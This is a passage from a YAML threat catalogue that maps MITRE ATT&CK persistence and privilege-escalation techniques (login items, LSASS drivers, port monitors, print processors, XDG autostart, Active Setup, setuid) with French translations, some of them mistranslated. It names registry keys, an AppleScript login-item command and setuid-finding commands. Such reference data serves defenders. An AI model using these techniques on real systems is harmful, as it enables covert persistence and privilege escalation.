      \ file to execute payloads when a user logs in.\nhttps://attack.mitre.org/techniques/T1547/007"
    translations:
      fr:
        name: Candidatures rouvertes
        description: "Les adversaires peuvent modifier les fichiers plist pour ex\xE9\
          cuter automatiquement une application lorsqu\u2019un utilisateur se connecte.\
          \ Lorsqu\u2019un utilisateur se d\xE9connecte ou red\xE9marre via l\u2019\
          interface graphique (GUI) de macOS, une invite est envoy\xE9e avec une case\
          \ \xE0 cocher : \xAB Ouvrir les fen\xEAtres lors de la reconnexion \xBB\
          . (Citation : Rouvrir les fen\xEAtres sur Mac) Une fois s\xE9lectionn\xE9\
          es, toutes les applications actuellement ouvertes sont ajout\xE9es \xE0\
          \ un fichier de liste de propri\xE9t\xE9s nomm\xE9 <code>com.apple.loginwindow.[\
          \ UUID].plist</code> dans le r\xE9pertoire <code>~/Library/Preferences/ByHost</code>.\
          \ (Citation : M\xE9thodes de persistance des malwares Mac)(Citation : Chapitre\
          \ de la pers\xE9v\xE9rance de Wardle) Les applications list\xE9es dans ce\
          \ fichier sont automatiquement rouvertes lors de la prochaine connexion\
          \ de l\u2019utilisateur.\n\nLes adversaires peuvent \xE9tablir [Persistance](https://attack.mitre.org/tactics/TA0003)\
          \ en ajoutant un chemin d\u2019application malveillant \xE0 <code>com.apple.loginwindow.[\
          \ UUID].plist</code> pour ex\xE9cuter des charges utiles lorsqu\u2019un\
          \ utilisateur se connecte.\nhttps://attack.mitre.org/techniques/T1547/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.008
    ref_id: T1547.008
    name: LSASS Driver
    description: 'Adversaries may modify or add LSASS drivers to obtain persistence
      on compromised systems. The Windows security subsystem is a set of components
      that manage and enforce the security policy for a computer or domain. The Local
      Security Authority (LSA) is the main component responsible for local security
      policy and user authentication. The LSA includes multiple dynamic link libraries
      (DLLs) associated with various other security functions, all of which run in
      the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation:
      Microsoft Security Subsystem)


      Adversaries may target LSASS drivers to obtain persistence. By either replacing
      or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)),
      an adversary can use LSA operations to continuously execute malicious payloads.

      https://attack.mitre.org/techniques/T1547/008'
    translations:
      fr:
        name: Conducteur LSASS
        description: "Les adversaires peuvent modifier ou ajouter des pilotes LSASS\
          \ pour obtenir la persistance sur des syst\xE8mes compromis. Le sous-syst\xE8\
          me de s\xE9curit\xE9 Windows est un ensemble de composants qui g\xE8rent\
          \ et appliquent la politique de s\xE9curit\xE9 d\u2019un ordinateur ou d\u2019\
          un domaine. L\u2019Autorit\xE9 de S\xE9curit\xE9 Locale (LSA) est le principal\
          \ composant responsable de la politique de s\xE9curit\xE9 locale et de l\u2019\
          authentification des utilisateurs. Le LSA comprend plusieurs biblioth\xE8\
          ques de liaison dynamique (DLL) associ\xE9es \xE0 diverses autres fonctions\
          \ de s\xE9curit\xE9, toutes fonctionnant dans le cadre du processus lsass.exe\
          \ du LSA Subsystem Service (LSASS). (Citation : Sous-syst\xE8me de s\xE9\
          curit\xE9 Microsoft)\n\nLes adversaires peuvent cibler les conducteurs LSASS\
          \ pour obtenir de la pers\xE9v\xE9rance. En rempla\xE7ant ou en ajoutant\
          \ des pilotes ill\xE9gitimes (par exemple, [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)),\
          \ un adversaire peut utiliser des op\xE9rations LSA pour ex\xE9cuter en\
          \ continu des charges utiles malveillantes.\nhttps://attack.mitre.org/techniques/T1547/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.009
    ref_id: T1547.009
    name: Shortcut Modification
    description: 'Adversaries may create or modify shortcuts that can execute a program
      during system boot or user login. Shortcuts or symbolic links are used to reference
      other files or programs that will be opened or executed when the shortcut is
      clicked or executed by a system startup process.


      Adversaries may abuse shortcuts in the startup folder to execute their tools
      and achieve persistence.(Citation: Shortcut for Persistence ) Although often
      used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)),
      adversaries may also create a new shortcut as a means of indirection, while
      also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the malicious shortcut appear as a legitimate program. Adversaries can also
      edit the target path or entirely replace an existing shortcut so their malware
      will be executed instead of the intended legitimate program.


      Shortcuts can also be abused to establish persistence by implementing other
      methods. For example, LNK browser extensions may be modified (e.g. [Browser
      Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently
      launch malware.

      https://attack.mitre.org/techniques/T1547/009'
    translations:
      fr:
        name: Modification de raccourci
        description: "Les adversaires peuvent cr\xE9er ou modifier des raccourcis\
          \ permettant d\u2019ex\xE9cuter un programme lors du d\xE9marrage du syst\xE8\
          me ou de la connexion utilisateur. Des raccourcis ou des liens symboliques\
          \ sont utilis\xE9s pour r\xE9f\xE9rencer d\u2019autres fichiers ou programmes\
          \ qui seront ouverts ou ex\xE9cut\xE9s lorsque le raccourci est cliqu\xE9\
          \ ou ex\xE9cut\xE9 par un processus de d\xE9marrage syst\xE8me.\n\nLes adversaires\
          \ peuvent abuser des raccourcis dans le dossier de d\xE9marrage pour ex\xE9\
          cuter leurs outils et obtenir la persistance. (Citation : Raccourci pour\
          \ la pers\xE9v\xE9rance) Bien que souvent utilis\xE9s comme charges utiles\
          \ dans une cha\xEEne d\u2019infection (par exemple [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)),\
          \ les adversaires peuvent aussi cr\xE9er un nouveau raccourci comme moyen\
          \ d\u2019indirection, tout en abusant de [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour faire para\xEEtre le raccourci malveillant comme un programme l\xE9\
          gitime. Les adversaires peuvent aussi modifier le chemin cible ou remplacer\
          \ enti\xE8rement un raccourci existant afin que leur malware soit ex\xE9\
          cut\xE9 \xE0 la place du programme l\xE9gitime pr\xE9vu.\n\nLes raccourcis\
          \ peuvent \xE9galement \xEAtre abus\xE9s pour \xE9tablir la persistance\
          \ en impl\xE9mentant d\u2019autres m\xE9thodes. Par exemple, les extensions\
          \ de navigateur LNK peuvent \xEAtre modifi\xE9es (par exemple [Extensions\
          \ de navigateur](https://attack.mitre.org/techniques/T1176/001)) pour lancer\
          \ de mani\xE8re persistante des logiciels malveillants.\nhttps://attack.mitre.org/techniques/T1547/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.010
    ref_id: T1547.010
    name: Port Monitors
    description: "Adversaries may use port monitors to run an adversary supplied DLL\
      \ during system boot for persistence or privilege escalation. A port monitor\
      \ can be set through the <code>AddMonitor</code> API call to set a DLL to be\
      \ loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\\
      Windows\\System32</code> and will be loaded and run by the print spooler service,\
      \ `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham)\
      \ \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing\
      \ a fully-qualified pathname for that DLL to the `Driver` value of an existing\
      \ or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\\
      Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\
      \n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\nhttps://attack.mitre.org/techniques/T1547/010"
    translations:
      fr:
        name: Moniteurs de port
        description: "Les adversaires peuvent utiliser des moniteurs de port pour\
          \ ex\xE9cuter une DLL fournie par l\u2019adversaire lors du d\xE9marrage\
          \ du syst\xE8me afin de persister ou d\u2019escalader des privil\xE8ges.\
          \ Un moniteur de port peut \xEAtre configur\xE9 via l\u2019appel <code>API\
          \ AddMonitor</code> pour configurer une DLL \xE0 charger au d\xE9marrage.\
          \ (Citation : AddMonitor) Cette DLL peut \xEAtre localis\xE9e dans <code>C\_\
          :\\Windows\\System32</code> et sera charg\xE9e et ex\xE9cut\xE9e par le\
          \ service de spooler d\u2019impression, 'spoolsv.exe', sous les autorisations\
          \ au niveau SYST\xC8ME au d\xE9marrage. (Citation : Bloxham) \n\nAlternativement,\
          \ une DLL arbitraire peut \xEAtre charg\xE9e si les permissions permettent\
          \ d\u2019\xE9crire un nom de chemin enti\xE8rement qualifi\xE9 pour cette\
          \ DLL \xE0 la valeur \xAB Driver \xBB d\u2019une sous-cl\xE9 existante ou\
          \ nouvelle nomm\xE9e arbitrairement de <code>HKLM\\SYSTEM\\CurrentControlSet\\\
          Control\\Print\\Monitors</code>. La cl\xE9 du Registre contient des entr\xE9\
          es pour les \xE9l\xE9ments suivants :\n\n* Port local\n* Port TCP/IP standard\n\
          * Moniteur USB\n* Porte-\xE0-porte WSD\nhttps://attack.mitre.org/techniques/T1547/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.012
    ref_id: T1547.012
    name: Print Processors
    description: 'Adversaries may abuse print processors to run malicious DLLs during
      system boot for persistence and/or privilege escalation. Print processors are
      DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation:
      Microsoft Intro Print Processors)


      Adversaries may abuse the print spooler service by adding print processors that
      load malicious DLLs at startup. A print processor can be installed through the
      <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code>
      enabled. Alternatively, a print processor can be registered to the print spooler
      service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows
      architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code>
      Registry key that points to the DLL.


      For the malicious print processor to be correctly installed, the payload must
      be located in the dedicated system print-processor directory, that can be found
      with the <code>GetPrintProcessorDirectory</code> API call, or referenced via
      a relative path from this directory.(Citation: Microsoft AddPrintProcessor May
      2018) After the print processors are installed, the print spooler service, which
      starts during boot, must be restarted in order for them to run.(Citation: ESET
      PipeMon May 2020)


      The print spooler service runs under SYSTEM level permissions, therefore print
      processors installed by an adversary may run under elevated privileges.

      https://attack.mitre.org/techniques/T1547/012'
    translations:
      fr:
        name: "Processeurs d\u2019impression"
        description: "Les adversaires peuvent abuser des processeurs d\u2019impression\
          \ pour ex\xE9cuter des DLL malveillantes lors du d\xE9marrage du syst\xE8\
          me afin de persister et/ou d\u2019augmenter les privil\xE8ges. Les processeurs\
          \ d\u2019impression sont des DLL charg\xE9s par le service de spooler d\u2019\
          impression, \xAB spoolsv.exe \xBB, lors du d\xE9marrage. (Citation : Microsoft\
          \ Intro Print Processors)\n\nLes adversaires peuvent abuser du service de\
          \ spooler d\u2019impression en ajoutant des processeurs d\u2019impression\
          \ qui chargent des DLL malveillants au d\xE9marrage. Un processeur d\u2019\
          impression peut \xEAtre install\xE9 via l\u2019appel API <code>AddPrintProcessor</code>\
          \ avec un compte ayant <code>activ\xE9 SeLoadDriverPrivilege</code>. Sinon,\
          \ un processeur d\u2019impression peut \xEAtre enregistr\xE9 au service\
          \ de spooler d\u2019impression en ajoutant la <code>cl\xE9 HKLM\\SYSTEM\\\
          \\[CurrentControlSet ou ControlSet001]\\Control\\Print\\Environments\\\\\
          [Architecture Windows : par exemple, Windows x64]\\Print Processors\\\\\
          [d\xE9fini par l\u2019utilisateur]\\Cl\xE9 du registre de pilotes</code>\
          \ qui pointe vers la DLL.\n\nPour que le processeur d\u2019impression malveillant\
          \ soit correctement install\xE9, la charge utile doit \xEAtre situ\xE9e\
          \ dans le r\xE9pertoire d\xE9di\xE9 du processeur d\u2019impression syst\xE8\
          me, qui peut \xEAtre trouv\xE9 avec l\u2019appel <code>API GetPrintProcessorDirectory</code>,\
          \ ou r\xE9f\xE9renc\xE9e via un chemin relatif depuis ce r\xE9pertoire.\
          \ (Citation : Microsoft AddPrintProcessor mai 2018) Apr\xE8s l\u2019installation\
          \ des processeurs d\u2019impression, le service de spooler d\u2019impression,\
          \ qui d\xE9marre au d\xE9marrage, doit \xEAtre red\xE9marr\xE9 pour qu\u2019\
          ils puissent fonctionner. (Citation : ESET PipeLundi mai 2020)\n\nLe service\
          \ de spooler d\u2019impression fonctionne sous des permissions au niveau\
          \ SYST\xC8ME, donc les processeurs d\u2019impression install\xE9s par un\
          \ adversaire peuvent fonctionner sous des privil\xE8ges \xE9lev\xE9s.\n\
          https://attack.mitre.org/techniques/T1547/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.013
    ref_id: T1547.013
    name: XDG Autostart Entries
    description: "Adversaries may add or modify XDG Autostart Entries to execute malicious\
      \ programs or commands when a user\u2019s desktop environment is loaded at login.\
      \ XDG Autostart entries are available for any XDG-compliant Linux system. XDG\
      \ Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019\
      s desktop environment upon user login. These configuration files determine what\
      \ applications launch upon user login, define associated applications to open\
      \ specific file types, and define applications used to open removable media.(Citation:\
      \ Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry\
      \ Keys)\n\nAdversaries may abuse this feature to establish persistence by adding\
      \ a path to a malicious binary or command to the `Exec` directive in the `.desktop`\
      \ configuration file. When the user\u2019s desktop environment is loaded at\
      \ user login, the `.desktop` files located in the XDG Autostart directories\
      \ are automatically executed. System-wide Autostart entries are located in the\
      \ `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart`\
      \ directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ to blend malicious Autostart entries with legitimate programs.(Citation: Red\
      \ Canary Netwire Linux 2022)\nhttps://attack.mitre.org/techniques/T1547/013"
    translations:
      fr:
        name: "Entr\xE9es XDG Autostart"
        description: "Les adversaires peuvent ajouter ou modifier les entr\xE9es d\u2019\
          autod\xE9marrage XDG pour ex\xE9cuter des programmes ou commandes malveillantes\
          \ lorsque l\u2019environnement de bureau d\u2019un utilisateur est charg\xE9\
          \ lors de la connexion. Les entr\xE9es Autostart XDG sont disponibles pour\
          \ tout syst\xE8me Linux conforme \xE0 XDG. Les entr\xE9es de d\xE9marrage\
          \ automatique XDG utilisent les fichiers d\u2019entr\xE9e du bureau ('.desktop')\
          \ pour configurer l\u2019environnement de bureau de l\u2019utilisateur lors\
          \ de la connexion. Ces fichiers de configuration d\xE9terminent quelles\
          \ applications se lancent lors de la connexion utilisateur, d\xE9finissent\
          \ les applications associ\xE9es pour ouvrir des types de fichiers sp\xE9\
          cifiques, et d\xE9finissent les applications utilis\xE9es pour ouvrir des\
          \ supports amovibles. (Citation : Application de bureau gratuite Autostart\
          \ f\xE9v 2006)(Citation : Cl\xE9s d\u2019entr\xE9e gratuites sur ordinateur)\n\
          \nLes adversaires peuvent abuser de cette fonctionnalit\xE9 pour \xE9tablir\
          \ la persistance en ajoutant un chemin vers un binaire malveillant ou une\
          \ commande vers la directive 'Exec' dans le fichier de configuration '.desktop'.\
          \ Lorsque l\u2019environnement de bureau de l\u2019utilisateur est charg\xE9\
          \ lors de la connexion, les fichiers '.desktop' situ\xE9s dans les r\xE9\
          pertoires XDG Autostart sont automatiquement ex\xE9cut\xE9s. Les entr\xE9\
          es Autostart \xE0 l\u2019\xE9chelle du syst\xE8me se trouvent dans le r\xE9\
          pertoire '/etc/xdg/autostart' tandis que les entr\xE9es utilisateur sont\
          \ dans le r\xE9pertoire '~/.config/autostart'.\n\nLes adversaires peuvent\
          \ combiner cette technique avec [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour m\xE9langer des entr\xE9es autod\xE9marrantes malveillantes avec\
          \ des programmes l\xE9gitimes. (Citation : Red Canary Netwire Linux 2022)\n\
          https://attack.mitre.org/techniques/T1547/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.014
    ref_id: T1547.014
    name: Active Setup
    description: 'Adversaries may achieve persistence by adding a Registry key to
      the Active Setup of the local machine. Active Setup is a Windows mechanism that
      is used to execute programs when a user logs in. The value stored in the Registry
      key will be executed after a user logs into the computer.(Citation: Klein Active
      Setup 2010) These programs will be executed under the context of the user and
      will have the account''s associated permissions level.


      Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active
      Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>.
      This value will serve as the program that will be executed when a user logs
      into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat
      2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright
      Star 2015)(Citation: paloalto Tropic Trooper 2016)


      Adversaries can abuse these components to execute malware, such as remote access
      tools, to maintain persistence through system reboots. Adversaries may also
      use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry
      entries look as if they are associated with legitimate programs.

      https://attack.mitre.org/techniques/T1547/014'
    translations:
      fr:
        name: Installation active
        description: "Les adversaires peuvent obtenir la persistance en ajoutant une\
          \ cl\xE9 de registre \xE0 la configuration active de la machine locale.\
          \ La configuration active est un m\xE9canisme Windows utilis\xE9 pour ex\xE9\
          cuter des programmes lorsqu\u2019un utilisateur se connecte. La valeur stock\xE9\
          e dans la cl\xE9 du Registre sera ex\xE9cut\xE9e apr\xE8s qu\u2019un utilisateur\
          \ se soit connect\xE9 \xE0 l\u2019ordinateur. (Citation : Klein Active Setup\
          \ 2010) Ces programmes seront ex\xE9cut\xE9s dans le contexte de l\u2019\
          utilisateur et auront le niveau d\u2019autorisation associ\xE9 au compte.\n\
          \nLes adversaires peuvent abuser de la configuration active en cr\xE9ant\
          \ une cl\xE9 sous <code> HKLM\\LOGICIEL\\Microsoft\\Active Setup\\Composants\
          \ install\xE9s\\</code> et en d\xE9finissant une valeur malveillante pour\
          \ <code>StubPath</code>. Cette valeur servira de programme qui sera ex\xE9\
          cut\xE9 lorsqu\u2019un utilisateur se connectera \xE0 l\u2019ordinateur.\
          \ (Citation : Mandiant Glyer APT 2010)(Citation : Citizenlab Packrat 2015)(Citation\
          \ : FireEye CFR Watering Hole 2012)(Citation : SECURELIST Bright Star 2015)(Citation\
          \ : paloalto Tropic Trooper 2016)\n\nLes adversaires peuvent exploiter ces\
          \ composants pour ex\xE9cuter des logiciels malveillants, tels que des outils\
          \ d\u2019acc\xE8s \xE0 distance, afin de maintenir la persistance lors des\
          \ red\xE9marrages du syst\xE8me. Les adversaires peuvent \xE9galement utiliser\
          \ [Masquerading](https://attack.mitre.org/techniques/T1036) pour faire para\xEE\
          tre les entr\xE9es du Registre associ\xE9es \xE0 des programmes l\xE9gitimes.\n\
          https://attack.mitre.org/techniques/T1547/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.015
    ref_id: T1547.015
    name: Login Items
    description: "Adversaries may add login items to execute upon user login to gain\
      \ persistence or escalate privileges. Login items are applications, documents,\
      \ folders, or server connections that are automatically launched when a user\
      \ logs in.(Citation: Open Login Items Apple) Login items can be added via a\
      \ shared file list or Service Management Framework.(Citation: Adding Login Items)\
      \ Shared file list login items can be set using scripting languages such as\
      \ [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the\
      \ Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\
      \nLogin items installed using the Service Management Framework leverage <code>launchd</code>,\
      \ are not visible in the System Preferences, and can only be removed by the\
      \ application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled\
      \ Schroeder 2013) Login items created using a shared file list are visible in\
      \ System Preferences, can hide the application when it launches, and are executed\
      \ through LaunchServices, not launchd, to open applications, documents, or URLs\
      \ without using Finder.(Citation: Launch Services Apple Developer) Users and\
      \ applications use login items to configure their user environment to launch\
      \ commonly used services or applications, such as email, chat, and music applications.\n\
      \nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ and [Native API](https://attack.mitre.org/techniques/T1106) calls to create\
      \ a login item to spawn malicious executables.(Citation: ELC Running at startup)\
      \ Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ to send an Apple events to the \u201CSystem Events\u201D process, which has\
      \ an AppleScript dictionary for manipulating login items.(Citation: Login Items\
      \ AE) Adversaries can use a command such as <code>tell application \u201CSystem\
      \ Events\u201D to make login item at end with properties /path/to/executable</code>.(Citation:\
      \ Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add\
      \ List Remove Login Items Apple Script) This command adds the path of the malicious\
      \ executable to the login item file list located in <code>~/Library/Application\
      \ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation:\
      \ Startup Items Eclectic) Adversaries can also use login items to launch executables\
      \ that can be used to control the victim system remotely or as a means to gain\
      \ privilege escalation by prompting for user credentials.(Citation: objsee mac\
      \ malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor\
      \ 2019)\nhttps://attack.mitre.org/techniques/T1547/015"
    translations:
      fr:
        name: "\xC9l\xE9ments de connexion"
        description: "Les adversaires peuvent ajouter des \xE9l\xE9ments de connexion\
          \ \xE0 ex\xE9cuter lors de la connexion utilisateur afin d\u2019obtenir\
          \ de la persistance ou d\u2019escalader des privil\xE8ges. Les \xE9l\xE9\
          ments de connexion sont des applications, documents, dossiers ou connexions\
          \ serveur qui sont automatiquement lanc\xE9s lorsqu\u2019un utilisateur\
          \ se connecte. (Citation : Ouvrir les \xE9l\xE9ments de connexion Apple)\
          \ Les \xE9l\xE9ments de connexion peuvent \xEAtre ajout\xE9s via une liste\
          \ de fichiers partag\xE9e ou un cadre de gestion de service. (Citation :\
          \ ajout d\u2019\xE9l\xE9ments de connexion) Les \xE9l\xE9ments de connexion\
          \ de liste de fichiers partag\xE9s peuvent \xEAtre configur\xE9s \xE0 l\u2019\
          aide de langages de script tels que [AppleScript](https://attack.mitre.org/techniques/T1059/002),\
          \ tandis que le Service Management Framework utilise l\u2019API <code>appel\xE9\
          \ SMLoginItemSetEnabled</code>.\n\nLes \xE9l\xE9ments de connexion install\xE9\
          s via le levier du Service Management Framework <code>lanc\xE9s</code> ne\
          \ sont pas visibles dans les Pr\xE9f\xE9rences Syst\xE8me et ne peuvent\
          \ \xEAtre supprim\xE9s que par l\u2019application qui les a cr\xE9\xE9s.\
          \ (Citation : ajout d\u2019\xE9l\xE9ments de connexion)(Citation : SMLoginItemSetEnabled\
          \ Schroeder 2013) Les \xE9l\xE9ments de connexion cr\xE9\xE9s \xE0 l\u2019\
          aide d\u2019une liste de fichiers partag\xE9e sont visibles dans les Pr\xE9\
          f\xE9rences syst\xE8me, peuvent masquer l\u2019application lors de son lancement\
          \ et sont ex\xE9cut\xE9s via LaunchServices, sans \xEAtre lanc\xE9s, pour\
          \ ouvrir des applications, documents ou URLs sans utiliser le Finder. (Citation\
          \ : Launch Services, d\xE9veloppeur Apple) Les utilisateurs et applications\
          \ utilisent des \xE9l\xE9ments de connexion pour configurer leur environnement\
          \ utilisateur afin de lancer des services ou applications couramment utilis\xE9\
          s, tels que les applications de messagerie, de chat et de musique.\n\nLes\
          \ adversaires peuvent utiliser des appels [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
          \ et [API native](https://attack.mitre.org/techniques/T1106) pour cr\xE9\
          er un \xE9l\xE9ment de connexion g\xE9n\xE9rant des ex\xE9cutables malveillants.\
          \ (Citation : ELC en cours au d\xE9marrage) Avant la version 10.5 sur macOS,\
          \ les adversaires pouvaient ajouter des \xE9l\xE9ments de connexion en utilisant\
          \ [AppleScript](https://attack.mitre.org/techniques/T1059/002) pour envoyer\
          \ un \xE9v\xE9nement Apple au processus \xAB \xC9v\xE9nements syst\xE8me\
          \ \xBB, qui dispose d\u2019un dictionnaire AppleScript pour manipuler les\
          \ \xE9l\xE9ments de connexion. (Citation : \xC9l\xE9ments de connexion AE)\
          \ Les adversaires peuvent utiliser une commande telle que <code>dire \xE0\
          \ l\u2019application \xAB \xC9v\xE9nements syst\xE8me \xBB pour cr\xE9er\
          \ un \xE9l\xE9ment de connexion \xE0 la fin avec les propri\xE9t\xE9s /path/to/executable</code>.\
          \ (Citation : Startup Items Eclectic)(Citation : analyse hexagonale de osx.dok\
          \ 2019)(Citation : Ajouter la liste Supprimer les \xE9l\xE9ments de connexion\
          \ Script Apple) Cette commande ajoute le chemin de l\u2019ex\xE9cutable\
          \ malveillant \xE0 la liste des fichiers d\u2019\xE9l\xE9ments de connexion\
          \ situ\xE9e dans <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.\
          \ (Citation : Startup Items Eclectic) Les adversaires peuvent \xE9galement\
          \ utiliser des \xE9l\xE9ments de connexion pour lancer des ex\xE9cutables\
          \ qui peuvent contr\xF4ler \xE0 distance le syst\xE8me victime ou comme\
          \ moyen d\u2019augmenter les privil\xE8ges en demandant des identifiants\
          \ utilisateur. (Citation : objsee Mac malware 2017)(Citation : CheckPoint\
          \ Dok)(Citation : objsee netwire backdoor 2019)\nhttps://attack.mitre.org/techniques/T1547/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548
    ref_id: T1548
    name: Abuse Elevation Control Mechanism
    description: 'Adversaries may circumvent mechanisms designed to control privilege
      elevation to gain higher-level permissions. Most modern systems contain native
      elevation control mechanisms that are intended to limit privileges that a user
      can perform on a machine. Authorization has to be granted to specific users
      in order to perform tasks that can be considered of higher risk.(Citation: TechNet
      How UAC Works)(Citation: sudo man page 2018) An adversary can perform several
      methods to take advantage of built-in control mechanisms in order to escalate
      privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)

      https://attack.mitre.org/techniques/T1548'
    translations:
      fr:
        name: "M\xE9canisme de contr\xF4le de l\u2019\xE9l\xE9vation de l\u2019abus"
        description: "Les adversaires peuvent contourner des m\xE9canismes con\xE7\
          us pour contr\xF4ler l\u2019\xE9l\xE9vation des privil\xE8ges afin d\u2019\
          obtenir des autorisations de niveau sup\xE9rieur. La plupart des syst\xE8\
          mes modernes contiennent des m\xE9canismes natifs de contr\xF4le d\u2019\
          \xE9l\xE9vation destin\xE9s \xE0 limiter les privil\xE8ges qu\u2019un utilisateur\
          \ peut exercer sur une machine. L\u2019autorisation doit \xEAtre accord\xE9\
          e \xE0 des utilisateurs sp\xE9cifiques afin d\u2019effectuer des t\xE2ches\
          \ qui peuvent \xEAtre consid\xE9r\xE9es comme \xE0 plus haut risque. (Citation\
          \ : TechNet Comment fonctionne l\u2019UAC)(Citation : page sudo man 2018)\
          \ Un adversaire peut effectuer plusieurs m\xE9thodes pour tirer parti des\
          \ m\xE9canismes de contr\xF4le int\xE9gr\xE9s afin d\u2019augmenter les\
          \ privil\xE8ges sur un syst\xE8me. (Citation : malware OSX Keydnap)(Citation\
          \ : Fortinet Fareit)\nhttps://attack.mitre.org/techniques/T1548"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.001
    ref_id: T1548.001
    name: Setuid and Setgid
    description: "An adversary may abuse configurations where an application has the\
      \ setuid or setgid bits set in order to get code running in a different (and\
      \ possibly more privileged) user\u2019s context. On Linux or macOS, when the\
      \ setuid or setgid bits are set for an application binary, the application will\
      \ run with the privileges of the owning user or group respectively.(Citation:\
      \ setuid man page) Normally an application is run in the current user\u2019\
      s context, regardless of which user or group owns the application. However,\
      \ there are instances where programs need to be executed in an elevated context\
      \ to function properly, but the user running them may not have the specific\
      \ required privileges.\n\nInstead of creating an entry in the sudoers file,\
      \ which must be done by root, any user can specify the setuid or setgid flag\
      \ to be set for their own applications (i.e. [Linux and Mac Permissions](https://attack.mitre.org/techniques/T1222/002)).\
      \ The <code>chmod</code> command can set these bits with bitmasking, <code>chmod\
      \ 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\
      \ This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code>\
      \ and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism\
      \ on their own malware to make sure they're able to execute in elevated contexts\
      \ in the future.(Citation: OSX Keydnap malware) This abuse is often part of\
      \ a \"shell escape\" or other actions to bypass an execution environment with\
      \ restricted permissions.\n\nAlternatively, adversaries may choose to find and\
      \ target vulnerable binaries with the setuid or setgid bits already enabled\
      \ (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)).\
      \ The setuid and setguid bits are indicated with an \"s\" instead of an \"x\"\
      \ when viewing a file's attributes via <code>ls -l</code>. The <code>find</code>\
      \ command can also be used to search for such files. For example, <code>find\
      \ / -perm +4000 2>/dev/null</code> can be used to find files with setuid set\
      \ and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries\
      \ that have these bits set may then be abused by adversaries.(Citation: GTFOBins\
      \ Suid)\nhttps://attack.mitre.org/techniques/T1548/001"
    translations:
      fr:
        name: Setuid et Setgid
        description: "Un adversaire peut abuser de configurations o\xF9 une application\
          \ a les bits de setuid ou setgid d\xE9finis afin de faire tourner du code\
          \ dans un contexte d\u2019utilisateur diff\xE9rent (et possiblement plus\
          \ privil\xE9gi\xE9). Sous Linux ou macOS, lorsque les bits de setuid ou\
          \ setgid sont d\xE9finis pour un binaire applicatif, l\u2019application\
          \ s\u2019ex\xE9cute avec les privil\xE8ges de l\u2019utilisateur ou du groupe\
          \ propri\xE9taire respectivement. (Citation : page de main setuid) Normalement,\
          \ une application est ex\xE9cut\xE9e dans le contexte de l\u2019utilisateur\
          \ actuel, quel que soit l\u2019utilisateur ou le groupe qui poss\xE8de l\u2019\
          application. Cependant, il existe des cas o\xF9 des programmes doivent \xEA\
          tre ex\xE9cut\xE9s dans un contexte \xE9lev\xE9 pour fonctionner correctement,\
          \ mais l\u2019utilisateur qui les ex\xE9cute peut ne pas disposer des privil\xE8\
          ges sp\xE9cifiques requis.\n\nAu lieu de cr\xE9er une entr\xE9e dans le\
          \ fichier sudoers, ce qui doit \xEAtre fait par root, tout utilisateur peut\
          \ sp\xE9cifier le drapeau setuid ou setgid \xE0 d\xE9finir pour ses propres\
          \ applications (c\u2019est-\xE0-dire [permissions Linux et Mac](https://attack.mitre.org/techniques/T1222/002)).\
          \ La commande <code>chmod</code> peut d\xE9finir ces bits avec le bitmasking,\
          \ <code>chmod 4777 [fichier]</code> ou, via un raccourci de nommage, <code>chmod\
